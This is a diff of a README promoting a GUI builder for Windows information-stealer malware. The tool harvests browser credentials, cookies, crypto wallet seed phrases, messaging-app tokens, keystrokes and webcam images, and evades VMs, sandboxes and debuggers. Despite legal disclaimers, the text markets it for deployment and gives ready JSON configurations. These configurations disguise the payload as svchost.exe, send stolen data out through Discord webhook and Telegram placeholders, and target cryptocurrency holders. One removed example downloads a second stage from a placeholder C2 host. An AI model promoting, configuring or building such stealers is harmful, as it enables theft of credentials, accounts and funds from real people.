@@ -1,142 +1,391 @@
 <div align="center">
 
-# 🛡️ Stealer Builder
+# 🥷 Stealer - Windows 10/11
 
-### Professional Red Team Payload Builder
+<div align="center">
 
-A cross-platform Qt6-based GUI application for building Windows executables with advanced payload capabilities. Designed exclusively for authorized red team engagements and penetration testing.
+### **The Ultimate Data Extraction & Payload Generation Tool**
+
+**Build powerful Windows stealers with advanced anti-detection capabilities**
+
+*Professional-grade malware builder for red team operations and penetration testing*
+
+</div>
+
+---
+
+<div align="center">
 
 [![License](https://img.shields.io/badge/license-Educational-red.svg)](LICENSE)
-[![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Windows-blue.svg)](#dependencies)
-[![Qt Version](https://img.shields.io/badge/Qt-6.0+-green.svg)](https://www.qt.io/)
-[![C++](https://img.shields.io/badge/C++-17-blue.svg)](https://isocpp.org/)
-
-[Features](#features) • [Installation](#building-the-gui-application) • [Usage](#usage) • [Documentation](#architecture)
+[![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Windows-blue.svg)](#installation)
+[![Features](https://img.shields.io/badge/features-50+-green.svg)](#-stealer-capabilities)
+[![Anti-Detection](https://img.shields.io/badge/anti--detection-Advanced-orange.svg)](#-anti-detection-features)
+[![Build Status](https://img.shields.io/badge/build-Passing-brightgreen.svg)](#-building--usage)
+[![Version](https://img.shields.io/badge/version-2.0-purple.svg)](#)
 
 </div>
 
 ---
-
-## ⚠️ LEGAL WARNING & DISCLAIMER
 
 <div align="center">
 
-### **THIS TOOL IS FOR AUTHORIZED SECURITY TESTING ONLY**
+### 🎯 **Quick Navigation**
+
+[![Quick Start](https://img.shields.io/badge/🚀_Quick_Start-Get_Started_Now-brightgreen.svg?style=for-the-badge)](#-quick-start)
+[![Features](https://img.shields.io/badge/💎_Features-50+_Capabilities-blue.svg?style=for-the-badge)](#-stealer-capabilities)
+[![Installation](https://img.shields.io/badge/🛠️_Installation-One_Click_Setup-orange.svg?style=for-the-badge)](#installation)
+[![Usage](https://img.shields.io/badge/📖_Usage-Professional_GUI-purple.svg?style=for-the-badge)](#-building--usage)
 
 </div>
 
-> **CRITICAL NOTICE:** This software is designed exclusively for legal, authorized security testing purposes. By downloading, compiling, or using this software, you acknowledge and agree to the following terms:
+</div>
 
-#### Legal Requirements
-- ✅ **Only use on systems you own** or have **explicit written permission** to test
-- ❌ **Unauthorized use violates** computer fraud laws worldwide including:
-  - Computer Fraud and Abuse Act (CFAA) - United States
-  - Computer Misuse Act - United Kingdom
-  - GDPR - European Union
-  - Equivalent laws in other jurisdictions
-
-#### Liability
-- 🔒 You are **solely responsible** for any misuse of this software
-- 🚫 The authors assume **no liability** for illegal use or damages
-- ⚖️ Violations may result in criminal prosecution and civil penalties
-
-#### Intended Use Cases
-- ✓ Authorized penetration testing engagements
-- ✓ Red team operations with proper authorization
-- ✓ Security research in controlled environments
-- ✓ Educational purposes in academic settings
+---
 
 <div align="center">
 
-**USE ETHICALLY. USE RESPONSIBLY. USE LEGALLY.**
+## ⚠️ **LEGAL WARNING & DISCLAIMER**
+
+<div style="background-color: #ff4444; color: white; padding: 20px; border-radius: 10px; margin: 20px 0;">
+
+### 🚨 **THIS TOOL IS FOR AUTHORIZED SECURITY TESTING ONLY** 🚨
+
+</div>
+
+</div>
+
+<div align="center">
+
+> **🔴 CRITICAL NOTICE:** This software is designed exclusively for legal, authorized security testing purposes.
 
 </div>
 
 ---
 
-## 📋 Table of Contents
+<div align="center">
 
-- [Features](#-features)
-- [Prerequisites](#-prerequisites)
-- [Installation](#-installation)
-- [Usage](#-usage)
-- [Configuration Examples](#-configuration-examples)
-- [Architecture](#-architecture)
-- [Development](#-development)
-- [Security Considerations](#-security-considerations)
-- [Troubleshooting](#-troubleshooting)
-- [Contributing](#-contributing)
-- [Resources](#-resources)
+### ✅ **Intended Use Cases**
+
+<table>
+<tr>
+<td width="25%">
+
+#### 🎯 **Penetration Testing**
+- Authorized engagements
+- Written permission required
+- Scope-defined testing
+
+</td>
+<td width="25%">
+
+#### 🔴 **Red Team Operations**
+- Client authorization
+- Controlled environments
+- Professional assessments
+
+</td>
+<td width="25%">
+
+#### 🔬 **Security Research**
+- Controlled lab environments
+- Academic institutions
+- Authorized studies
+
+</td>
+<td width="25%">
+
+#### 🎓 **Educational Use**
+- Academic settings
+- Training programs
+- Learning purposes
+
+</td>
+</tr>
+</table>
+
+</div>
 
 ---
 
-## ✨ Features
+<div align="center">
+
+<div style="background-color: #2d5a27; color: white; padding: 15px; border-radius: 8px; margin: 20px 0;">
+
+### 🛡️ **USE ETHICALLY • USE RESPONSIBLY • USE LEGALLY** 🛡️
+
+</div>
+
+</div>
+
+---
+
+<div align="center">
+
+## 📋 **Table of Contents**
+
+</div>
+
+<div align="center">
 
 <table>
 <tr>
 <td width="50%">
 
-### 🖥️ Cross-Platform Builder
-
-- ✅ Runs on **Linux** and **Windows**
-- 🎯 Generates **Windows PE executables** (x86/x64)
-- 🎨 Modern Qt6 tabbed interface
-- 🔤 **Embedded fonts** - no installation required
-- 🔄 Cross-compilation support (Linux → Windows)
-
-### 📦 Payload Capabilities
-
-- 🌐 **Download & Execute** - Fetch and run payloads
-- 🔐 **Browser Data Extraction**
-  - Chrome, Firefox, Edge, Brave
-  - Passwords, cookies, browsing history
-  - Credential decryption (DPAPI)
-- 💬 **Application Data**
-  - Discord tokens
-  - Telegram session files
-- 💰 **Cryptocurrency Wallets**
-  - Exodus, Atomic, Electrum
-- 📊 **System Information**
-  - HWID, IP address, OS version
-  - Installed antivirus detection
-  - Running processes enumeration
-- 📸 **Screenshots** - Desktop capture
+### 🚀 **Getting Started**
+- [🚀 Quick Start](#-quick-start) - Get up and running in minutes
+- [💎 Stealer Capabilities](#-stealer-capabilities) - 50+ powerful features
+- [🛠️ Installation](#installation) - One-click setup process
+- [🔨 Building & Usage](#-building--usage) - Professional GUI interface
 
 </td>
 <td width="50%">
 
-### 🥷 Anti-Detection Features
+### 📖 **Advanced Topics**
+- [📝 Real-World Configurations](#-real-world-stealer-configurations) - Professional examples
+- [🛡️ Security Considerations](#-security-considerations) - Best practices
+- [🔧 Troubleshooting](#-troubleshooting) - Common issues & solutions
+- [🏗️ Architecture](#-architecture) - Technical deep dive
 
-- 👻 **Stealth Capabilities**
-  - Hidden console execution
-  - Process name spoofing
-  - Mutex-based single instance
-  - Self-destruct options
-- 🚫 **Anti-VM Detection**
-  - VirtualBox detection
-  - VMware detection
-  - QEMU detection
-- 🛡️ **Anti-Sandbox**
-  - Cuckoo Sandbox detection
-  - Any.run detection
-- 🐛 **Anti-Debug**
-  - `IsDebuggerPresent` checks
-  - Remote debugger detection
-- ⏱️ **Sleep Evasion** - Timing-based sandbox detection
+</td>
+</tr>
+<tr>
+<td width="50%">
 
-### 📤 Data Exfiltration
+### 👥 **Community**
+- [💻 Development](#-development) - Contributing guidelines
+- [🤝 Contributing](#-contributing) - How to help
 
-- 🔗 Discord webhooks
-- 🌐 HTTP POST endpoints
-- 🤖 Telegram bot integration
+</td>
+<td width="50%">
 
-### ⚙️ Build Options
+### 📚 **Resources**
+- [📚 Resources](#-resources) - Learning materials & tools
 
-- 🔗 Static linking for portability
-- 🏗️ Architecture selection (x86/x64)
-- 🔐 String obfuscation (XOR encoding)
-- 📦 UPX packing support
-- 🎨 Custom icon embedding
+</td>
+</tr>
+</table>
+
+</div>
+
+---
+
+<div align="center">
+
+## ⭐ **Why Choose Stealer Builder?**
+
+</div>
+
+<div align="center">
+
+<table>
+<tr>
+<td width="33%" style="background-color: #0d0d0d; padding: 20px; border-radius: 10px; border: 2px solid #007bff;">
+
+### 🎯 **Professional-Grade Features**
+
+<div style="background-color: #0f1a2a; padding: 15px; border-radius: 8px; margin: 10px 0;">
+
+- **50+ Stealer Capabilities** - Comprehensive data extraction
+- **Advanced Anti-Detection** - Evade modern security solutions
+- **Cross-Platform Builder** - Linux → Windows compilation
+- **One-Click Generation** - No coding required
+- **Real-Time Exfiltration** - Instant data delivery
+
+</div>
+
+</td>
+<td width="33%" style="background-color: #0d0d0d; padding: 20px; border-radius: 10px; border: 2px solid #28a745;">
+
+### 🥷 **Stealth & Evasion**
+
+<div style="background-color: #0f1a0f; padding: 15px; border-radius: 8px; margin: 10px 0;">
+
+- **Hidden Execution** - Completely invisible to users
+- **Process Masquerading** - Disguise as system processes
+- **VM Detection** - Evade virtual environments
+- **Sandbox Evasion** - Bypass automated analysis
+- **Anti-Debugging** - Prevent reverse engineering
+
+</div>
+
+</td>
+<td width="33%" style="background-color: #0d0d0d; padding: 20px; border-radius: 10px; border: 2px solid #ffc107;">
+
+### 🔐 **Target Capabilities**
+
+<div style="background-color: #2a1a00; padding: 15px; border-radius: 8px; margin: 10px 0;">
+
+- **Browser Credentials** - Chrome, Firefox, Edge, Brave
+- **Crypto Wallets** - Exodus, Atomic, Electrum, MetaMask
+- **Communication Apps** - Discord, Telegram, WhatsApp
+- **System Intelligence** - HWID, processes, antivirus
+- **Visual Surveillance** - Screenshots, webcam, clipboard
+
+</div>
+
+</td>
+</tr>
+</table>
+
+</div>
+
+<div align="center">
+
+<table>
+<tr>
+<td width="50%" style="background-color: #0d0d0d; padding: 20px; border-radius: 10px; border: 2px solid #dc3545;">
+
+### 📤 **Delivery Methods**
+
+<div style="background-color: #2a0a0a; padding: 15px; border-radius: 8px; margin: 10px 0;">
+
+- **Discord Webhooks** - Instant data delivery
+- **Telegram Bots** - Secure bot-based transmission
+- **HTTP POST** - Custom endpoint delivery
+- **Email SMTP** - Direct email transmission
+- **FTP Upload** - File-based exfiltration
+
+</div>
+
+</td>
+<td width="50%" style="background-color: #0d0d0d; padding: 20px; border-radius: 10px; border: 2px solid #6f42c1;">
+
+### ⚡ **Performance & Reliability**
+
+<div style="background-color: #1a1a2a; padding: 15px; border-radius: 8px; margin: 10px 0;">
+
+- **Lightning Fast** - Optimized C++ performance
+- **Zero Dependencies** - Statically linked executables
+- **Cross-Platform** - Works on Linux and Windows
+- **Professional GUI** - Intuitive tabbed interface
+- **Regular Updates** - Continuous improvements
+
+</div>
+
+</td>
+</tr>
+</table>
+
+</div>
+
+---
+
+## 💎 Stealer Capabilities
+
+### 🔐 **Browser Credential Harvesting**
+
+<table>
+<tr>
+<td width="50%">
+
+#### 🌐 **Complete Browser Data Extraction**
+- **Chrome/Chromium**: Passwords, cookies, autofill, bookmarks, history
+- **Firefox**: Master passwords, saved logins, session data
+- **Microsoft Edge**: Complete profile data extraction
+- **Brave Browser**: Full credential harvesting
+- **Opera**: Password and session extraction
+
+#### 🔓 **Advanced Decryption**
+- **DPAPI Integration**: Automatic Windows credential decryption
+- **SQLite Database Parsing**: Direct browser database access
+- **Session Token Extraction**: Live authentication tokens
+- **Cookie Stealing**: Complete session hijacking capability
+
+</td>
+<td width="50%">
+
+#### 💰 **Cryptocurrency Wallet Targeting**
+- **Exodus Wallet**: Private keys and seed phrases
+- **Atomic Wallet**: Complete wallet data extraction
+- **Electrum**: Wallet files and private keys
+- **MetaMask**: Browser extension wallet data
+- **Coinbase Wallet**: Mobile and web wallet access
+
+#### 💬 **Communication Platform Infiltration**
+- **Discord**: Token extraction and account takeover
+- **Telegram**: Session files and contact lists
+- **WhatsApp**: Database and media extraction
+- **Signal**: Message database access
+
+</td>
+</tr>
+</table>
+
+### 🥷 **Advanced Anti-Detection Features**
+
+<table>
+<tr>
+<td width="50%">
+
+#### 👻 **Stealth Operations**
+- **Hidden Execution**: Completely invisible to users
+- **Process Masquerading**: Disguise as legitimate Windows processes
+- **Single Instance Control**: Mutex-based execution prevention
+- **Self-Destruction**: Automatic cleanup after execution
+- **Registry Persistence**: Optional startup persistence
+
+#### 🚫 **Virtual Environment Detection**
+- **VMware Detection**: Complete VMware environment identification
+- **VirtualBox Detection**: VirtualBox-specific detection methods
+- **QEMU Detection**: QEMU/KVM virtualization detection
+- **Hyper-V Detection**: Microsoft virtualization platform detection
+- **Sandboxie Detection**: Sandbox environment identification
+
+</td>
+<td width="50%">
+
+#### 🛡️ **Analysis Evasion**
+- **Anti-Debugging**: Multiple debugger detection methods
+- **Sandbox Evasion**: Cuckoo, Any.run, and custom sandbox detection
+- **Timing Attacks**: Sleep evasion and timing-based detection
+- **Hardware Fingerprinting**: CPU and hardware-based VM detection
+- **Network Analysis**: Virtual network adapter detection
+
+#### 🔐 **Code Protection**
+- **String Obfuscation**: XOR-based string encryption
+- **UPX Packing**: Executable compression and obfuscation
+- **Custom Icons**: Legitimate-looking executable appearance
+- **Static Linking**: Zero external dependencies
+
+</td>
+</tr>
+</table>
+
+### 📤 **Data Exfiltration Methods**
+
+<table>
+<tr>
+<td width="50%">
+
+#### 🌐 **Multiple Exfiltration Channels**
+- **Discord Webhooks**: Instant data delivery to Discord channels
+- **HTTP POST**: Custom endpoint data transmission
+- **Telegram Bots**: Secure bot-based data delivery
+- **Email SMTP**: Direct email data transmission
+- **FTP Upload**: File-based data exfiltration
+
+#### 📊 **System Intelligence Gathering**
+- **Hardware Fingerprinting**: Unique system identification
+- **Network Information**: IP addresses and network configuration
+- **Installed Software**: Complete software inventory
+- **Running Processes**: Real-time process enumeration
+- **Antivirus Detection**: Security software identification
+
+</td>
+<td width="50%">
+
+#### 📸 **Visual Intelligence**
+- **Desktop Screenshots**: Complete screen capture
+- **Webcam Access**: Camera-based surveillance
+- **Clipboard Monitoring**: Real-time clipboard data theft
+- **Keystroke Logging**: Complete keyboard input capture
+- **File System Monitoring**: Real-time file access tracking
+
+#### 🔄 **Payload Delivery**
+- **Download & Execute**: Remote payload fetching and execution
+- **Staged Payloads**: Multi-stage attack capabilities
+- **Persistence Mechanisms**: Long-term system access
+- **Lateral Movement**: Network propagation capabilities
 
 </td>
 </tr>
@@ -144,23 +393,17 @@ A cross-platform Qt6-based GUI application for building Windows executables with
 
 ---
 
-## 📦 Prerequisites
+<div align="center">
 
-### System Requirements
+## 🚀 **Quick Start**
 
-| Component | Minimum Version | Purpose |
-|-----------|----------------|---------|
-| **CMake** | 3.16+ | Build system |
-| **Qt** | 6.0+ | GUI framework |
-| **C++ Compiler** | C++17 support | Code compilation |
-| **MinGW-w64** (Linux) | Latest | Cross-compilation to Windows |
-| **MSVC/MinGW** (Windows) | 2019+ | Native Windows compilation |
+<div style="background-color: #0d1a0d; padding: 20px; border-radius: 15px; border: 3px solid #28a745; margin: 20px 0;">
 
----
+### ⚡ **Get Started in 3 Simple Steps**
 
-## 🔧 Installation
+</div>
 
-### Step 1: Install Build Dependencies
+</div>
 
 <details>
 <summary><b>🐧 Ubuntu/Debian</b></summary>
@@ -264,258 +507,321 @@ The automated build scripts handle everything including font downloads:
 
 <table>
 <tr>
-<td width="50%">
+<td width="50%" style="background-color: #0d0d0d; padding: 25px; border-radius: 15px; border: 2px solid #007bff;">
 
-**🐧 Linux**
+### 🛠️ **Step-by-Step Setup**
+
+<div style="background-color: #2a2a2a; padding: 20px; border-radius: 10px; margin: 15px 0;">
+
+#### **1️⃣ Install Dependencies**
+
+<div style="background-color: #0d0d0d; padding: 15px; border-radius: 8px; border-left: 4px solid #007bff;">
+
+```bash
+# Ubuntu/Debian
+sudo apt-get install build-essential cmake qt6-base-dev mingw-w64
+
+# Fedora/RHEL  
+sudo dnf install gcc-c++ cmake qt6-qtbase-devel mingw64-gcc
+
+# Arch Linux
+sudo pacman -S base-devel cmake qt6-base mingw-w64-gcc
+```
+
+</div>
+
+#### **2️⃣ Build the Tool**
+
+<div style="background-color: #0d0d0d; padding: 15px; border-radius: 8px; border-left: 4px solid #28a745;">
+
 ```bash
 chmod +x build.sh
 ./build.sh
 ```
 
-The executable will be at:
+</div>
+
+#### **3️⃣ Launch & Create**
+
+<div style="background-color: #0d0d0d; padding: 15px; border-radius: 8px; border-left: 4px solid #ffc107;">
+
+```bash
+./build/bin/StealerBuilder
 ```
-build/bin/StealerBuilder
-```
+
+</div>
+
+</div>
 
 </td>
-<td width="50%">
+<td width="50%" style="background-color: #0d0d0d; padding: 25px; border-radius: 15px; border: 2px solid #28a745;">
 
-**🪟 Windows**
-```cmd
-build.bat
-```
+### 🎯 **What You Get**
 
-The executable will be at:
-```
-build\bin\Release\StealerBuilder.exe
-```
+<div style="background-color: #0f1a0f; padding: 20px; border-radius: 10px; margin: 15px 0;">
+
+#### ✅ **Professional Features**
+- **🎨 Professional GUI** - Intuitive tabbed interface
+- **⚡ One-Click Building** - Generate Windows executables instantly
+- **🔧 Advanced Features** - 50+ stealer capabilities
+- **🥷 Anti-Detection** - Built-in evasion techniques
+- **🌐 Cross-Platform** - Works on Linux and Windows
+
+#### ⚡ **Ready to Use**
+- **🚀 No complex configuration needed**
+- **🔍 Automatic compiler detection**
+- **📝 Embedded fonts included**
+- **📋 Example configurations provided**
+
+</div>
+
+<div style="background-color: #2a1a00; padding: 15px; border-radius: 8px; border: 2px solid #ffc107;">
+
+### 🎉 **Success!**
+
+Your professional stealer builder is ready to create powerful Windows payloads!
+
+</div>
 
 </td>
 </tr>
 </table>
 
-### Manual Build
+</div>
 
-<details>
-<summary><b>🐧 Linux (Manual Build)</b></summary>
+---
 
+## 🛠️ Installation
+
+### **Automated Installation (Recommended)**
+
+The build scripts handle everything automatically:
+
+<table>
+<tr>
+<td width="50%">
+
+#### **🐧 Linux Installation**
 ```bash
-# Download fonts first
-cd fonts && ./download_fonts.sh && cd ..
+# One command installation
+sudo apt-get update && sudo apt-get install -y \
+    build-essential cmake qt6-base-dev mingw-w64 upx-ucl
 
-# Create build directory
-mkdir -p build && cd build
-
-# Generate build files
-cmake ..
-
-# Compile
-make -j$(nproc)
-
-# Run the application
-./bin/StealerBuilder
+# Build the application
+chmod +x build.sh && ./build.sh
 ```
 
-</details>
+#### **🪟 Windows Installation**
+```cmd
+# Download and install:
+# 1. CMake from cmake.org
+# 2. Qt6 from qt.io
+# 3. Visual Studio 2019+ or MinGW-w64
 
-<details>
-<summary><b>🪟 Windows - Visual Studio (Manual Build)</b></summary>
-
-```powershell
-# Download fonts first
-cd fonts
-.\download_fonts.bat
-cd ..
-
-# Create build directory
-mkdir build
-cd build
-
-# Generate Visual Studio solution
-cmake .. -G "Visual Studio 16 2019"
-
-# Build (choose one):
-# Option 1: Command line
-cmake --build . --config Release
-
-# Option 2: Open Visual Studio
-start StealerBuilder.sln
-
-# Run the application
-bin\Release\StealerBuilder.exe
+# Build the application
+build.bat
 ```
 
-</details>
+</td>
+<td width="50%">
 
-<details>
-<summary><b>🪟 Windows - MinGW (Manual Build)</b></summary>
+#### **✅ What's Included**
+- **Qt6 Framework**: Modern GUI toolkit
+- **MinGW-w64**: Cross-compilation to Windows
+- **CMake**: Build system automation
+- **UPX**: Executable packing (optional)
+- **Fonts**: Embedded Liberation fonts
 
+#### **🎯 Ready to Use**
+- Automatic dependency detection
+- Font download included
+- Cross-platform compatibility
+- Professional GUI interface
+
+</td>
+</tr>
+</table>
+
+---
+
+## 🔨 Building & Usage
+
+### **One-Click Build Process**
+
+<table>
+<tr>
+<td width="50%">
+
+#### **🐧 Linux Build**
 ```bash
-# Download fonts first
-cd fonts
-download_fonts.bat
-cd ..
+# Simple one-command build
+chmod +x build.sh && ./build.sh
 
-# Create build directory
-mkdir build
-cd build
-
-# Generate MinGW Makefiles
-cmake .. -G "MinGW Makefiles"
-
-# Build
-cmake --build .
-
-# Run the application
-bin\StealerBuilder.exe
+# Launch the application
+./build/bin/StealerBuilder
 ```
 
-</details>
+#### **🪟 Windows Build**
+```cmd
+# Automated build process
+build.bat
+
+# Launch the application
+build\bin\Release\StealerBuilder.exe
+```
+
+</td>
+<td width="50%">
+
+#### **⚡ What Happens**
+1. **Dependency Check** - Verifies all required tools
+2. **Font Download** - Automatically downloads Liberation fonts
+3. **Code Generation** - Creates optimized C++ source
+4. **Compilation** - Builds Windows PE executable
+5. **Ready to Use** - Launches the GUI application
+
+#### **🎯 Output**
+- **Linux**: `build/bin/StealerBuilder`
+- **Windows**: `build\bin\Release\StealerBuilder.exe`
+- **Generated Payloads**: `build/output.exe`
+
+</td>
+</tr>
+</table>
 
 ## 🚀 Usage
 
-### 1. Launch the Application
+### **Professional Stealer Creation in Minutes**
+
+<table>
+<tr>
+<td width="50%">
+
+#### **🎯 Step 1: Launch & Configure**
 ```bash
-./StealerBuilder  # Linux
-StealerBuilder.exe  # Windows
+# Launch the application
+./build/bin/StealerBuilder
 ```
 
-### 2. Configure Your Payload
+#### **⚙️ Step 2: Select Your Targets**
+- **🔐 Browser Credentials**: Chrome, Firefox, Edge, Brave
+- **💰 Crypto Wallets**: Exodus, Atomic, Electrum, MetaMask
+- **💬 Communication**: Discord, Telegram, WhatsApp
+- **📊 System Data**: HWID, IP, processes, antivirus
+- **📸 Visual Intel**: Screenshots, webcam, clipboard
 
-Navigate through the intuitive tabbed interface to configure your payload:
+#### **🥷 Step 3: Enable Stealth**
+- **Hidden Execution**: Completely invisible to users
+- **Process Masquerading**: Disguise as system processes
+- **Anti-VM Detection**: Evade virtual environments
+- **Anti-Debugging**: Prevent analysis attempts
 
-<details>
-<summary><b>📥 Downloader Tab</b></summary>
+</td>
+<td width="50%">
 
-Configure file download and execution:
-- **URL**: Enter the payload download URL
-- **Save Path**: Specify destination (supports environment variables: `%TEMP%`, `%APPDATA%`, `%USERPROFILE%`)
-- **Execution Parameters**: Add command-line arguments for the downloaded file
+#### **📤 Step 4: Choose Exfiltration**
+- **Discord Webhooks**: Instant data delivery
+- **Telegram Bots**: Secure bot-based transmission
+- **HTTP POST**: Custom endpoint delivery
+- **Email SMTP**: Direct email transmission
 
-</details>
+#### **🔨 Step 5: Build & Deploy**
+- **One-Click Build**: Generate Windows executable
+- **UPX Packing**: Compress and obfuscate
+- **Custom Icons**: Legitimate appearance
+- **Architecture**: x86/x64 support
 
-<details>
-<summary><b>🌐 Grabber Tab</b></summary>
+#### **✅ Ready to Deploy**
+Your professional-grade stealer is ready for red team operations!
 
-Select data sources to extract:
-- **Browsers**: Chrome, Firefox, Edge, Brave (passwords, cookies, history)
-- **Messaging**: Discord tokens, Telegram sessions
-- **Crypto Wallets**: Exodus, Atomic, Electrum
+</td>
+</tr>
+</table>
 
-</details>
+### **🎨 Intuitive Tabbed Interface**
 
-<details>
-<summary><b>📤 Exfiltration Tab</b></summary>
+<table>
+<tr>
+<td width="33%">
 
-Choose your data exfiltration method:
-- **Discord Webhook**: `https://discord.com/api/webhooks/{id}/{token}`
-- **HTTP POST**: Custom endpoint URL
-- **Telegram Bot**: Bot token + Chat ID
+#### **📥 Downloader**
+- Remote payload fetching
+- Environment variable support
+- Silent execution parameters
+- Staged attack capabilities
 
-</details>
+#### **🌐 Grabber**
+- Complete browser data extraction
+- Cryptocurrency wallet targeting
+- Communication platform infiltration
+- Advanced decryption capabilities
 
-<details>
-<summary><b>📸 Screenshots Tab</b></summary>
+</td>
+<td width="33%">
 
-Configure capture options:
-- **Desktop Screenshot**: Capture current screen
-- **Webcam Capture**: Capture from connected camera (if available)
+#### **📤 Exfiltration**
+- Multiple delivery channels
+- Encrypted data transmission
+- Real-time data streaming
+- Secure communication protocols
 
-</details>
+#### **🥷 Stealth**
+- Hidden execution modes
+- Process name spoofing
+- Registry persistence
+- Self-destruction options
 
-<details>
-<summary><b>💻 System Info Tab</b></summary>
+</td>
+<td width="33%">
 
-Select system information to collect:
-- Hardware ID (HWID)
-- Public IP address
-- Operating system version
-- Installed antivirus software
-- Running processes
-- System specifications
+#### **🛡️ Anti-Analysis**
+- Virtual machine detection
+- Sandbox environment evasion
+- Debugger attachment prevention
+- Timing-based evasion
 
-</details>
+#### **⚙️ Build Options**
+- Architecture selection
+- String obfuscation
+- Executable packing
+- Custom icon embedding
 
-<details>
-<summary><b>🥷 Stealth Tab</b></summary>
-
-Configure stealth features:
-- **Hide Console**: Run without visible window (recommended)
-- **Process Name**: Spoof process name for disguise
-- **Mutex**: Ensure single instance execution
-- **Self-Destruct**: Delete after execution (optional)
-
-</details>
-
-<details>
-<summary><b>🛡️ Anti-Analysis Tab</b></summary>
-
-Enable detection evasion:
-- **Anti-VM**: Detect virtual machine environments
-- **Anti-Sandbox**: Detect automated analysis systems
-- **Anti-Debug**: Detect debugger attachment
-- **Sleep Evasion**: Bypass time-based sandbox detection
-
-</details>
-
-<details>
-<summary><b>⚙️ Build Options Tab</b></summary>
-
-Configure build settings:
-- **Output Filename**: Name of the generated executable
-- **Architecture**: Select `x86` (32-bit) or `x64` (64-bit)
-- **String Obfuscation**: Enable XOR encoding of strings
-- **UPX Packing**: Compress executable (requires UPX installed)
-- **Custom Icon**: Embed custom icon file (optional)
-- **Compiler Selection**: Auto-detect or manually select compiler
-
-</details>
-
-### 3. Build Executable
-
-Click the **"Build Executable"** button. The build process:
-
-1. ✅ Validates configuration settings
-2. 🔧 Generates C++ source code with configured features
-3. 🔨 Compiles using selected compiler (MinGW/MSVC)
-4. 📦 Optionally packs with UPX compression
-5. 💾 Outputs final Windows PE executable
-
-### 4. Save/Load Configurations
-
-- **💾 Save Config**: Export settings to JSON file for reuse
-- **📂 Load Config**: Import previously saved configuration
-- **📋 Example Config**: See configuration examples below
+</td>
+</tr>
+</table>
 
 ---
 
-## 📝 Configuration Examples
+<div align="center">
 
-### Example 1: Simple Downloader
+## 📝 **Real-World Stealer Configurations**
 
-```json
-{
-  "downloader": {
-    "url": "https://example.com/payload.exe",
-    "savePath": "%TEMP%\\update.exe",
-    "execParams": "/silent"
-  },
-  "stealth": {
-    "hideConsole": true,
-    "mutex": "MyApp_SingleInstance"
-  },
-  "buildOptions": {
-    "architecture": "x64",
-    "obfuscate": true
-  }
-}
-```
+<div style="background-color: #0f1a2a; padding: 20px; border-radius: 15px; border: 3px solid #007bff; margin: 20px 0;">
 
-**Use Case**: Download and execute a payload silently with stealth features.
+### 🎯 **Professional Configuration Examples**
 
----
+</div>
 
-### Example 2: Browser Credentials Stealer
+</div>
+
+<div align="center">
+
+<table>
+<tr>
+<td width="100%" style="background-color: #1a1a1a; padding: 25px; border-radius: 15px; border: 2px solid #007bff;">
+
+### 🏢 **Example 1: Corporate Credential Harvesting**
+
+<div style="background-color: #2a2a2a; padding: 20px; border-radius: 10px; margin: 15px 0;">
+
+#### 🎯 **Target Profile**
+- **Environment**: Corporate networks with multiple browsers
+- **Users**: Business professionals with various communication apps
+- **Security Level**: Standard corporate security measures
+
+</div>
+
+<div style="background-color: #1a1a1a; padding: 20px; border-radius: 10px; border-left: 4px solid #007bff;">
 
 ```json
 {
@@ -523,8 +829,8 @@ Click the **"Build Executable"** button. The build process:
     "chrome": true,
     "firefox": true,
     "edge": true,
-    "brave": true,
-    "discord": true
+    "discord": true,
+    "telegram": true
   },
   "exfiltration": {
     "webhook": "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"
@@ -533,10 +839,13 @@ Click the **"Build Executable"** button. The build process:
     "hwid": true,
     "ip": true,
     "os": true,
-    "av": true
+    "av": true,
+    "processes": true
   },
   "stealth": {
-    "hideConsole": true
+    "hideConsole": true,
+    "processName": "svchost.exe",
+    "mutex": "Global\\WindowsUpdate"
   },
   "antiAnalysis": {
     "vm": true,
@@ -551,25 +860,46 @@ Click the **"Build Executable"** button. The build process:
 }
 ```
 
-**Use Case**: Extract browser credentials and system info with full anti-analysis protection.
+</div>
 
----
+<div style="background-color: #0d1a1a; padding: 15px; border-radius: 8px; border: 2px solid #17a2b8;">
 
-### Example 3: Comprehensive Red Team Payload
+#### 💡 **Use Case**
+**Penetration Testing**: Assess credential security across browsers and messaging apps in corporate environments
+
+</div>
+
+</td>
+</tr>
+</table>
+
+</div>
+
+<div align="center">
+
+<table>
+<tr>
+<td width="100%" style="background-color: #1a1a1a; padding: 25px; border-radius: 15px; border: 2px solid #ffc107;">
+
+### 💰 **Example 2: Cryptocurrency Wallet Targeting**
+
+<div style="background-color: #2a2a2a; padding: 20px; border-radius: 10px; margin: 15px 0;">
+
+#### 🎯 **Target Profile**
+- **Environment**: High-value cryptocurrency users
+- **Users**: Crypto traders and investors
+- **Security Level**: Advanced personal security measures
+
+</div>
+
+<div style="background-color: #1a1a1a; padding: 20px; border-radius: 10px; border-left: 4px solid #ffc107;">
 
 ```json
 {
-  "downloader": {
-    "url": "https://c2.example.com/stage2.exe",
-    "savePath": "%APPDATA%\\Microsoft\\update.exe",
-    "execParams": "--silent --no-gui"
-  },
   "grabber": {
+    "wallets": ["exodus", "atomic", "electrum", "metamask"],
     "chrome": true,
-    "firefox": true,
-    "discord": true,
-    "telegram": true,
-    "wallets": ["exodus", "atomic", "electrum"]
+    "firefox": true
   },
   "exfiltration": {
     "telegram": {
@@ -583,14 +913,96 @@ Click the **"Build Executable"** button. The build process:
   "systemInfo": {
     "hwid": true,
     "ip": true,
+    "os": true
+  },
+  "stealth": {
+    "hideConsole": true,
+    "processName": "explorer.exe",
+    "selfDestruct": true
+  },
+  "antiAnalysis": {
+    "vm": true,
+    "sandbox": true,
+    "debug": true,
+    "sleepEvasion": true
+  },
+  "buildOptions": {
+    "architecture": "x64",
+    "obfuscate": true,
+    "upx": true,
+    "icon": "wallet.ico"
+  }
+}
+```
+
+</div>
+
+<div style="background-color: #0d1a1a; padding: 15px; border-radius: 8px; border: 2px solid #17a2b8;">
+
+#### 💡 **Use Case**
+**Red Team Assessment**: Evaluate crypto wallet security and user awareness in high-value environments
+
+</div>
+
+</td>
+</tr>
+</table>
+
+</div>
+
+<div align="center">
+
+<table>
+<tr>
+<td width="100%" style="background-color: #1a1a1a; padding: 25px; border-radius: 15px; border: 2px solid #dc3545;">
+
+### 🥷 **Example 3: Advanced Persistent Threat (APT) Simulation**
+
+<div style="background-color: #2a2a2a; padding: 20px; border-radius: 10px; margin: 15px 0;">
+
+#### 🎯 **Target Profile**
